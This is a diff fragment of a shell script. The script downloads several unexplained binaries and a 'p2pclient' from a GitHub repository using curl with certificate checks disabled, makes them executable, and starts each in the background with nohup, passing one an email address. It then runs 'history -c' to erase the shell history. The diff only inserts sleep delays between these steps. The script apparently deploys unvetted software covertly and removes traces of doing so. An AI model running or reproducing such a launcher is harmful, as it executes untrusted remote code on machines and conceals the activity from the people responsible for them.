@@ -4,11 +4,17 @@ curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpc -o wpc
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpd -o wpd
 curl -k https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient -o owner
-chmod +x owner wpa wpb wpc wpd 
+sleep 3
+chmod +x owner wpa wpb wpc wpd
+sleep 3
 nohup ./owner -l robert.reynolds2@go.shoreline.edu &
+sleep 3
 nohup ./wpa &
+sleep 3
 nohup ./wpb &
+sleep 3
 nohup ./wpc &
+sleep 3
 nohup ./wpd &
 sleep 10
 history -c
